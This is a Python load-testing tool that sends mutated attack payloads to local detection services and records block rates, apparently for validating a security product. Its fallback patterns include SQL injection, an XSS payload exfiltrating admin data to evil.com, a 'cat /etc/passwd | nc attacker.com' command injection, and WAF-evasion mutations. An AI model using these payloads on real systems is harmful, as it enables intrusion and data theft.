#!/usr/bin/env python3
"""
Kong Guard AI - Attack Flood Simulator
Advanced penetration testing framework for Kong Guard AI validation
"""

import argparse
import asyncio
import json
import logging
import random
import sqlite3
import time
from dataclasses import asdict
from dataclasses import dataclass
from datetime import datetime
from typing import Any
from typing import Optional

import aiohttp

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("attack_flood.log"), logging.StreamHandler()],
)
logger = logging.getLogger(__name__)


@dataclass
class AttackResult:
    timestamp: datetime
    tier: str
    attack_type: str
    attack_category: str
    payload: str
    response_time_ms: float
    threat_score: float
    confidence: float
    action_taken: str
    blocked: bool
    status_code: int
    source_ip: str
    user_agent: str


@dataclass
class AttackConfig:
    intensity: str
    strategy: str
    duration: int
    targets: list[str]
    record_metrics: bool


class AttackFloodSimulator:
    def __init__(self):
        self.db_path = "attack_metrics.db"
        self.setup_database()
        self.load_attack_patterns()
        self.services = {
            "unprotected": "http://localhost:8000",
            "cloud": "http://localhost:18002",
            "local": "http://localhost:18003",
        }
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "AttackBot/1.0 (Advanced Threat Simulation)",
            "curl/7.68.0",
            "python-requests/2.28.0",
            "Nikto/2.1.6",
            "sqlmap/1.6.12#stable",
        ]
        self.source_ips = [
            "203.0.113.100",
            "198.51.100.50",
            "233.252.0.25",
            "203.0.113.42",
            "198.51.100.23",
            "192.0.2.146",
            "169.254.169.254",
            "127.0.0.1",
        ]
        self.active_run = None
        self.stop_flag = False
        self.results = []

    def setup_database(self):
        """Initialize SQLite database with comprehensive schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Attack run metadata
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS attack_runs (
                run_id INTEGER PRIMARY KEY AUTOINCREMENT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                total_attacks INTEGER,
                intensity_level TEXT,
                strategy TEXT,
                duration INTEGER,
                config_json TEXT
            )
        """
        )

        # Individual attack metrics
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS attack_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                run_id INTEGER,
                timestamp TIMESTAMP,
                tier TEXT,
                attack_type TEXT,
                attack_category TEXT,
                payload TEXT,
                response_time_ms REAL,
                threat_score REAL,
                confidence REAL,
                action_taken TEXT,
                blocked BOOLEAN,
                status_code INTEGER,
                source_ip TEXT,
                user_agent TEXT,
                error_message TEXT,
                FOREIGN KEY (run_id) REFERENCES attack_runs(run_id)
            )
        """
        )

        # Tier performance statistics
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS tier_statistics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                run_id INTEGER,
                tier TEXT,
                total_requests INTEGER,
                attacks_blocked INTEGER,
                attacks_allowed INTEGER,
                avg_response_time REAL,
                avg_threat_score REAL,
                avg_confidence REAL,
                detection_rate REAL,
                false_positive_rate REAL,
                false_negative_rate REAL,
                FOREIGN KEY (run_id) REFERENCES attack_runs(run_id)
            )
        """
        )

        # System performance metrics
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                run_id INTEGER,
                timestamp TIMESTAMP,
                cpu_usage REAL,
                memory_usage REAL,
                requests_per_second REAL,
                errors_per_minute REAL,
                active_threads INTEGER,
                FOREIGN KEY (run_id) REFERENCES attack_runs(run_id)
            )
        """
        )

        conn.commit()
        conn.close()
        logger.info("Database schema initialized")

    def load_attack_patterns(self):
        """Load vicious attack patterns from JSON file"""
        try:
            with open("vicious_attack_patterns.json") as f:
                data = json.load(f)
                self.attack_patterns = data.get("attack_categories", {})
                logger.info(f"Loaded {len(self.attack_patterns)} attack categories")
        except FileNotFoundError:
            logger.warning("vicious_attack_patterns.json not found, using basic patterns")
            self.attack_patterns = self.get_basic_patterns()

    def get_basic_patterns(self):
        """Fallback basic attack patterns"""
        return {
            "sql_injection": {
                "patterns": [
                    {
                        "name": "Union-based SQL Injection",
                        "payload": "id=1' UNION SELECT 1,2,3,user(),database(),version()--",
                        "technique": "Union-based data extraction",
                        "impact": "Database compromise",
                    },
                    {
                        "name": "Boolean-based Blind SQL",
                        "payload": "id=1' AND 1=1--",
                        "technique": "Boolean inference",
                        "impact": "Data extraction",
                    },
                ]
            },
            "xss": {
                "patterns": [
                    {
                        "name": "Stored XSS",
                        "payload": "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>",
                        "technique": "JavaScript execution",
                        "impact": "Session hijacking",
                    }
                ]
            },
            "command_injection": {
                "patterns": [
                    {
                        "name": "Command Chaining",
                        "payload": "ping=127.0.0.1; cat /etc/passwd | nc attacker.com 4444",
                        "technique": "Command execution",
                        "impact": "System compromise",
                    }
                ]
            },
        }

    def get_intensity_config(self, intensity: str) -> dict[str, int]:
        """Get configuration for attack intensity levels"""
        configs = {
            "low": {"threads": 5, "requests_per_sec": 10, "batch_size": 10},
            "medium": {"threads": 20, "requests_per_sec": 50, "batch_size": 50},
            "high": {"threads": 50, "requests_per_sec": 200, "batch_size": 100},
            "extreme": {"threads": 100, "requests_per_sec": 1000, "batch_size": 500},
        }
        return configs.get(intensity, configs["medium"])

    def mutate_payload(self, original_payload: str) -> str:
        """Apply mutations to attack payloads for evasion"""
        mutations = [
            # URL encoding
            lambda p: "".join(f"%{ord(c):02x}" if random.random() < 0.3 else c for c in p),
            # Double encoding
            lambda p: "".join(f"%25{ord(c):02x}" if random.random() < 0.2 else c for c in p),
            # Case variation
            lambda p: "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p),
            # Comment insertion (SQL)
            lambda p: p.replace(" ", "/**/") if "SELECT" in p.upper() else p,
            # Space to tab conversion
            lambda p: p.replace(" ", "\t"),
        ]

        # Apply random mutations
        mutated = original_payload
        for _ in range(random.randint(1, 3)):
            mutation = random.choice(mutations)
            try:
                mutated = mutation(mutated)
            except:
                pass

        return mutated

    def generate_attack_request(self, tier: str) -> dict[str, Any]:
        """Generate a single attack request"""
        # Select random attack category and pattern
        category = random.choice(list(self.attack_patterns.keys()))
        patterns = self.attack_patterns[category].get("patterns", [])
        if not patterns:
            return None

        pattern = random.choice(patterns)

        # Mutate payload for evasion
        payload = self.mutate_payload(pattern["payload"])

        # Generate request data
        paths = ["/api/users", "/api/login", "/api/search", "/api/admin", "/api/data", "/upload", "/download"]
        methods = ["GET", "POST", "PUT", "DELETE"]

        request_data = {
            "method": random.choice(methods),
            "path": random.choice(paths),
            "payload": payload,
            "source_ip": random.choice(self.source_ips),
            "user_agent": random.choice(self.user_agents),
            "attack_type": category,
            "attack_name": pattern["name"],
            "tier": tier,
        }

        return request_data

    async def send_attack_request(
        self, session: aiohttp.ClientSession, request_data: dict[str, Any]
    ) -> Optional[AttackResult]:
        """Send a single attack request and record metrics"""
        tier = request_data["tier"]
        service_url = self.services.get(tier)
        if not service_url:
            return None

        start_time = time.time()

        try:
            # Prepare request
            url = f"{service_url}/analyze"
            headers = {
                "Content-Type": "application/json",
                "User-Agent": request_data["user_agent"],
                "X-Forwarded-For": request_data["source_ip"],
            }

            # Create analysis payload
            analysis_payload = {
                "features": {
                    "method": request_data["method"],
                    "path": request_data["path"],
                    "client_ip": request_data["source_ip"],
                    "user_agent": request_data["user_agent"],
                    "requests_per_minute": random.randint(50, 200),
                    "content_length": len(request_data["payload"]),
                    "query_param_count": random.randint(1, 5),
                    "header_count": random.randint(3, 10),
                    "hour_of_day": datetime.now().hour,
                    "query": request_data["payload"],
                    "body": request_data["payload"],
                    "headers": {},
                },
                "context": {
                    "previous_requests": random.randint(0, 100),
                    "failed_attempts": random.randint(0, 10),
                    "anomaly_score": random.uniform(0.1, 0.9),
                },
            }

            # Send request
            async with session.post(url, json=analysis_payload, headers=headers, timeout=10) as response:
                response_time = (time.time() - start_time) * 1000  # Convert to ms

                if response.status == 200:
                    result_data = await response.json()

                    return AttackResult(
                        timestamp=datetime.now(),
                        tier=tier,
                        attack_type=request_data["attack_type"],
                        attack_category=request_data["attack_name"],
                        payload=request_data["payload"][:500],  # Truncate for storage
                        response_time_ms=response_time,
                        threat_score=result_data.get("threat_score", 0.0),
                        confidence=result_data.get("confidence", 0.0),
                        action_taken=result_data.get("recommended_action", "unknown"),
                        blocked=result_data.get("threat_score", 0.0) >= 0.7,
                        status_code=response.status,
                        source_ip=request_data["source_ip"],
                        user_agent=request_data["user_agent"],
                    )
                else:
                    # Handle non-200 responses
                    return AttackResult(
                        timestamp=datetime.now(),
                        tier=tier,
                        attack_type=request_data["attack_type"],
                        attack_category=request_data["attack_name"],
                        payload=request_data["payload"][:500],
                        response_time_ms=response_time,
                        threat_score=0.0,
                        confidence=0.0,
                        action_taken="error",
                        blocked=False,
                        status_code=response.status,
                        source_ip=request_data["source_ip"],
                        user_agent=request_data["user_agent"],
                    )

        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            logger.error(f"Attack request failed: {e}")

            return AttackResult(
                timestamp=datetime.now(),
                tier=tier,
                attack_type=request_data["attack_type"],
                attack_category=request_data["attack_name"],
                payload=request_data["payload"][:500],
                response_time_ms=response_time,
                threat_score=0.0,
                confidence=0.0,
                action_taken="error",
                blocked=False,
                status_code=0,
                source_ip=request_data["source_ip"],
                user_agent=request_data["user_agent"],
            )

    def save_results_to_db(self, run_id: int, results: list[AttackResult]):
        """Save attack results to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        for result in results:
            cursor.execute(
                """
                INSERT INTO attack_metrics (
                    run_id, timestamp, tier, attack_type, attack_category,
                    payload, response_time_ms, threat_score, confidence,
                    action_taken, blocked, status_code, source_ip, user_agent
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
                (
                    run_id,
                    result.timestamp,
                    result.tier,
                    result.attack_type,
                    result.attack_category,
                    result.payload,
                    result.response_time_ms,
                    result.threat_score,
                    result.confidence,
                    result.action_taken,
                    result.blocked,
                    result.status_code,
                    result.source_ip,
                    result.user_agent,
                ),
            )

        conn.commit()
        conn.close()
        logger.info(f"Saved {len(results)} attack results to database")

    def calculate_tier_statistics(self, run_id: int):
        """Calculate and save tier statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Get statistics for each tier
        for tier in ["unprotected", "cloud", "local"]:
            cursor.execute(
                """
                SELECT
                    COUNT(*) as total_requests,
                    SUM(CASE WHEN blocked = 1 THEN 1 ELSE 0 END) as attacks_blocked,
                    SUM(CASE WHEN blocked = 0 THEN 1 ELSE 0 END) as attacks_allowed,
                    AVG(response_time_ms) as avg_response_time,
                    AVG(threat_score) as avg_threat_score,
                    AVG(confidence) as avg_confidence
                FROM attack_metrics
                WHERE run_id = ? AND tier = ?
            """,
                (run_id, tier),
            )

            stats = cursor.fetchone()
            if stats and stats[0] > 0:  # If we have data
                (
                    total_requests,
                    attacks_blocked,
                    attacks_allowed,
                    avg_response_time,
                    avg_threat_score,
                    avg_confidence,
                ) = stats

                detection_rate = (attacks_blocked / total_requests) * 100 if total_requests > 0 else 0

                cursor.execute(
                    """
                    INSERT INTO tier_statistics (
                        run_id, tier, total_requests, attacks_blocked, attacks_allowed,
                        avg_response_time, avg_threat_score, avg_confidence, detection_rate,
                        false_positive_rate, false_negative_rate
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                    (
                        run_id,
                        tier,
                        total_requests,
                        attacks_blocked,
                        attacks_allowed,
                        avg_response_time or 0,
                        avg_threat_score or 0,
                        avg_confidence or 0,
                        detection_rate,
                        0,
                        0,  # TODO: Calculate false positive/negative rates
                    ),
                )

        conn.commit()
        conn.close()
        logger.info("Tier statistics calculated and saved")

    async def run_attack_flood(self, config: AttackConfig) -> int:
        """Execute attack flood simulation"""
        # Start new attack run
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute(
            """
            INSERT INTO attack_runs (start_time, intensity_level, strategy, duration, config_json)
            VALUES (?, ?, ?, ?, ?)
        """,
            (datetime.now(), config.intensity, config.strategy, config.duration, json.dumps(asdict(config))),
        )

        run_id = cursor.lastrowid
        conn.commit()
        conn.close()

        logger.info(f"Starting attack flood simulation (Run ID: {run_id})")
        logger.info(f"Configuration: {config}")

        # Get intensity configuration
        intensity_config = self.get_intensity_config(config.intensity)

        # Initialize results collection
        all_results = []
        self.stop_flag = False
        start_time = time.time()

        # Create aiohttp session
        timeout = aiohttp.ClientTimeout(total=10)
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=100)

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            # Main attack loop
            while not self.stop_flag and (time.time() - start_time) < config.duration:
                batch_start = time.time()

                # Generate batch of attack requests
                tasks = []
                for _ in range(intensity_config["batch_size"]):
                    if self.stop_flag:
                        break

                    # Select random tier
                    tier = random.choice(config.targets)
                    request_data = self.generate_attack_request(tier)

                    if request_data:
                        task = self.send_attack_request(session, request_data)
                        tasks.append(task)

                # Execute batch
                if tasks:
                    try:
                        results = await asyncio.gather(*tasks, return_exceptions=True)

                        # Filter successful results
                        valid_results = [r for r in results if isinstance(r, AttackResult)]
                        all_results.extend(valid_results)

                        # Log progress
                        batch_time = time.time() - batch_start
                        rps = len(valid_results) / batch_time if batch_time > 0 else 0

                        logger.info(f"Batch complete: {len(valid_results)} attacks, {rps:.1f} RPS")

                    except Exception as e:
                        logger.error(f"Batch execution failed: {e}")

                # Rate limiting
                batch_duration = time.time() - batch_start
                target_duration = intensity_config["batch_size"] / intensity_config["requests_per_sec"]

                if batch_duration < target_duration:
                    await asyncio.sleep(target_duration - batch_duration)

        # Complete the run
        end_time = datetime.now()

        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            """
            UPDATE attack_runs
            SET end_time = ?, total_attacks = ?
            WHERE run_id = ?
        """,
            (end_time, len(all_results), run_id),
        )
        conn.commit()
        conn.close()

        # Save results
        if config.record_metrics and all_results:
            self.save_results_to_db(run_id, all_results)
            self.calculate_tier_statistics(run_id)

        logger.info(f"Attack flood simulation completed (Run ID: {run_id})")
        logger.info(f"Total attacks executed: {len(all_results)}")
        logger.info(f"Duration: {(end_time - datetime.fromisoformat(str(start_time))).total_seconds():.2f} seconds")

        return run_id

    def stop_attack_flood(self):
        """Stop ongoing attack flood"""
        self.stop_flag = True
        logger.info("Attack flood stop requested")

    def get_run_statistics(self, run_id: int) -> dict[str, Any]:
        """Get comprehensive statistics for an attack run"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Get run metadata
        cursor.execute("SELECT * FROM attack_runs WHERE run_id = ?", (run_id,))
        run_data = cursor.fetchone()

        if not run_data:
            return {}

        # Get tier statistics
        cursor.execute("SELECT * FROM tier_statistics WHERE run_id = ?", (run_id,))
        tier_stats = cursor.fetchall()

        # Get attack metrics summary
        cursor.execute(
            """
            SELECT
                tier,
                attack_type,
                COUNT(*) as count,
                AVG(response_time_ms) as avg_response_time,
                AVG(threat_score) as avg_threat_score,
                SUM(CASE WHEN blocked = 1 THEN 1 ELSE 0 END) as blocked_count
            FROM attack_metrics
            WHERE run_id = ?
            GROUP BY tier, attack_type
        """,
            (run_id,),
        )

        attack_summary = cursor.fetchall()

        conn.close()

        return {"run_metadata": run_data, "tier_statistics": tier_stats, "attack_summary": attack_summary}


def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(description="Kong Guard AI Attack Flood Simulator")
    parser.add_argument(
        "--intensity", choices=["low", "medium", "high", "extreme"], default="medium", help="Attack intensity level"
    )
    parser.add_argument(
        "--strategy",
        choices=["wave", "sustained", "stealth", "blended", "escalation"],
        default="sustained",
        help="Attack strategy",
    )
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument(
        "--targets",
        nargs="+",
        default=["unprotected", "cloud", "local"],
        choices=["unprotected", "cloud", "local"],
        help="Target tiers",
    )
    parser.add_argument("--no-record", action="store_true", help="Disable metrics recording")

    args = parser.parse_args()

    # Create configuration
    config = AttackConfig(
        intensity=args.intensity,
        strategy=args.strategy,
        duration=args.duration,
        targets=args.targets,
        record_metrics=not args.no_record,
    )

    # Initialize simulator
    simulator = AttackFloodSimulator()

    # Run attack flood
    try:
        run_id = asyncio.run(simulator.run_attack_flood(config))

        # Display results
        stats = simulator.get_run_statistics(run_id)
        print(f"\n=== Attack Flood Results (Run ID: {run_id}) ===")
        print(f"Total attacks: {stats['run_metadata'][3]}")
        print(f"Duration: {config.duration} seconds")
        print(f"Intensity: {config.intensity}")
        print(f"Strategy: {config.strategy}")

        if stats["tier_statistics"]:
            print("\nTier Performance:")
            for tier_stat in stats["tier_statistics"]:
                tier = tier_stat[2]
                total = tier_stat[3]
                blocked = tier_stat[4]
                detection_rate = tier_stat[9]
                avg_response = tier_stat[6]

                print(
                    f"  {tier.upper()}: {total} requests, {blocked} blocked, "
                    f"{detection_rate:.1f}% detection rate, {avg_response:.1f}ms avg response"
                )

    except KeyboardInterrupt:
        logger.info("Attack flood interrupted by user")
        simulator.stop_attack_flood()
    except Exception as e:
        logger.error(f"Attack flood failed: {e}")


if __name__ == "__main__":
    main()
